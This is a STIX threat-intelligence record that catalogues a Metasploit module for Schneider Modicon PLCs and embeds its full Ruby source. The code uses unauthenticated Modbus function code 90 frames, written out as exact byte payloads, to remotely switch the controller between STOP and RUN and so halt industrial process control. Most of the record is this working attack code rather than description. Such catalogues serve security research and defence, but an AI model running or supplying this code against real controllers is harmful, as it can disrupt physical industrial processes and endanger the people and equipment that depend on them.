{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6c2164fc-de68-46f4-b137-54052b350496",
    "created": "2024-08-14T16:22:23.771574Z",
    "modified": "2024-08-14T16:22:23.771577Z",
    "name": "Schneider Modicon Remote START/STOP Command",
    "description": " The Schneider Modicon with Unity series of PLCs use Modbus function code 90 (0x5a) to perform administrative commands without authentication. This module allows a remote user to change the state of the PLC between STOP and RUN, allowing an attacker to end process control by the PLC.  This module is based on the original 'modiconstop.rb' Basecamp module from DigitalBond. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/scada/modicon_command.rb",
            "external_id": "modicon_command.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.digitalbond.com/tools/basecamp/metasploit-modules/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Rex::Socket::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'Schneider Modicon Remote START/STOP Command',\n      'Description'   => %q{\n        The Schneider Modicon with Unity series of PLCs use Modbus function\n        code 90 (0x5a) to perform administrative commands without authentication.\n        This module allows a remote user to change the state of the PLC between\n        STOP and RUN, allowing an attacker to end process control by the PLC.\n\n        This module is based on the original 'modiconstop.rb' Basecamp module from\n        DigitalBond.\n      },\n      'Author'         =>\n        [\n          'K. Reid Wightman <wightman[at]digitalbond.com>', # original module\n          'todb' # Metasploit fixups\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'URL', 'http://www.digitalbond.com/tools/basecamp/metasploit-modules/' ]\n        ],\n      'DisclosureDate' => '2012-04-05'\n      ))\n    register_options(\n      [\n        OptEnum.new(\"MODE\", [true, 'PLC command', \"STOP\",\n          [\n            \"STOP\",\n            \"RUN\"\n          ]\n        ]),\n        Opt::RPORT(502)\n      ])\n\n  end\n\n  # this is used for building a Modbus frame\n  # just prepends the payload with a modbus header\n  def makeframe(packetdata)\n    if packetdata.size > 255\n      print_error(\"packet too large, sorry\")\n      print_error(\"Offending packet: \" + packetdata)\n      return\n    end\n    payload = \"\"\n    payload += [@modbuscounter].pack(\"n\")\n    payload += \"\\x00\\x00\\x00\" #dunno what these are\n    payload += [packetdata.size].pack(\"c\") # size byte\n    payload += packetdata\n  end\n\n  # a wrapper just to be sure we increment the counter\n  def sendframe(payload)\n    sock.put(payload)\n    @modbuscounter += 1\n    r = sock.recv(65535, 0.1) # XXX: All I care is that we wait for a packet to come in, but I'd like to minimize the wait time and also minimize OS buffer use.  What to do?\n    return r\n  end\n\n  # This function sends some initialization requests\n  # I have no idea what these do, but they seem to be\n  # needed to get the Modicon chatty with us.\n  # I would make some analogy to 'gaming' in the\n  # bar-dating scene, but I'll refrain.\n  def init\n    payload = \"\\x00\\x5a\\x00\\x02\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x01\\x00\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x0a\\x00\" + 'T' * 0xf9\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x03\\x00\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x03\\x04\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x04\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x01\\x00\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x0a\\x00\"\n    (0..0xf9).each { |x| payload += [x].pack(\"c\") }\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x04\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x04\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x20\\x00\\x13\\x00\\x00\\x00\\x00\\x00\\x64\\x00\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x20\\x00\\x13\\x00\\x64\\x00\\x00\\x00\\x9c\\x00\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x20\\x00\\x14\\x00\\x00\\x00\\x00\\x00\\x64\\x00\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x20\\x00\\x14\\x00\\x64\\x00\\x00\\x00\\xf6\\x00\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x20\\x00\\x14\\x00\\x5a\\x01\\x00\\x00\\xf6\\x00\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x20\\x00\\x14\\x00\\x5a\\x02\\x00\\x00\\xf6\\x00\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x20\\x00\\x14\\x00\\x46\\x03\\x00\\x00\\xf6\\x00\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x20\\x00\\x14\\x00\\x3c\\x04\\x00\\x00\\xf6\\x00\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x20\\x00\\x14\\x00\\x32\\x05\\x00\\x00\\xf6\\x00\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x20\\x00\\x14\\x00\\x28\\x06\\x00\\x00\\x0c\\x00\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x20\\x00\\x13\\x00\\x00\\x00\\x00\\x00\\x64\\x00\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x20\\x00\\x13\\x00\\x64\\x00\\x00\\x00\\x9c\\x00\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x10\\x43\\x4c\\x00\\x00\\x0f\"\n    payload += \"USER-714E74F21B\" # Yep, really\n    #payload += \"META-SPLOITMETA\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x01\\x04\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x01\\x50\\x15\\x00\\x01\\x0b\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x01\\x50\\x15\\x00\\x01\\x07\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x01\\x12\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x01\\x04\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x01\\x12\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x01\\x04\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x02\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x58\\x01\\x00\\x00\\x00\\x00\\xff\\xff\\x00\\x70\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x58\\x07\\x01\\x80\\x00\\x00\\x00\\x00\\xfb\\x00\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x01\\x04\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x58\\x07\\x01\\x80\\x00\\x00\\x00\\x00\\xfb\\x00\"\n    sendframe(makeframe(payload))\n  end\n\n  def stop\n    payload = \"\\x00\\x5a\\x01\\x41\\xff\\x00\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x01\\x04\"\n    sendframe(makeframe(payload))\n  end\n\n  def start\n    payload = \"\\x00\\x5a\\x01\\x40\\xff\\x00\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x01\\x04\"\n    sendframe(makeframe(payload))\n  end\n\n  def run\n    @modbuscounter = 0x0000 # used for modbus frames\n    connect\n    init\n    case datastore['MODE']\n    when \"STOP\"\n      stop\n    when \"RUN\"\n      start\n    else\n      print_error(\"Invalid MODE\")\n      return\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-04-05"
}